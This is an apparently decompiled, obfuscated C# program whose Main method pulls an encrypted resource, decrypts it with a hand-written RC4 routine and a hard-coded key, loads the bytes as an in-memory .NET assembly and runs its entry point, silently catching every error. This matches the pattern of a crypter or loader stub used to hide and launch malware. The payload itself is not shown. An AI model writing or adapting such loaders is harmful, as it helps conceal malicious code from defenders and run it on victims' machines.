using System;
using System.Reflection;
using System.Resources;

namespace ns0;

internal sealed class Class0
{
	private static void Main(string[] args)
	{
		object[] parameters = new object[0];
		Class2.Class4.smethod_0(new Random(), 300, 750, 'è', 142);
		long num = Class2.smethod_0(970, 'Ϧ');
		_ = Class2.smethod_0(711, '\u02eb') - num;
		try
		{
			ResourceManager gparam_ = new ResourceManager("res", Class5.Class6.smethod_0(621, 617));
			byte[] byte_ = smethod_0((byte[])Class5.smethod_0(gparam_, "zjHhOJckKWQ", 798, 826), "FYlp17wXE0fFKHMCR9uc6o1o95e0YpVRCWonCrW8ASstKvovFJ9EA4Gq7");
			Class2.Class3.smethod_0(gparam_, '\u030f', 801);
			Assembly assembly = Class2.smethod_1(byte_, 921, 968);
			if (Class2.smethod_2(assembly, 849, '\u0335').GetParameters().Length > 0)
			{
				parameters = new object[1] { args };
			}
			assembly.EntryPoint!.Invoke(null, parameters);
		}
		catch
		{
		}
	}

	public static byte[] smethod_0(byte[] byte_0, string string_0)
	{
		byte[] array = Class5.smethod_1(Class2.Class3.smethod_1('ʿ', 'ʙ'), string_0, 118, 21);
		byte[] array2 = new byte[256];
		byte[] array3 = new byte[256];
		int i;
		for (i = 0; i < 256; i++)
		{
			array2[i] = (byte)i;
			array3[i] = array[i % Class2.smethod_3((Array)array, 0, (short)732, 'ʰ')];
		}
		int num = 0;
		for (i = 0; i < 256; i++)
		{
			num = (num + array2[i] + array3[i]) % 256;
			byte b = array2[i];
			array2[i] = array2[num];
			array2[num] = b;
		}
		num = 0;
		i = 0;
		for (int j = 0; j < byte_0.GetLength(0); j++)
		{
			i = (i + 1) % 256;
			num = (num + array2[i]) % 256;
			byte b = array2[i];
			array2[i] = array2[num];
			array2[num] = b;
			int num2 = (array2[i] + array2[num]) % 256;
			byte_0[j] ^= array2[num2];
		}
		return byte_0;
	}
}
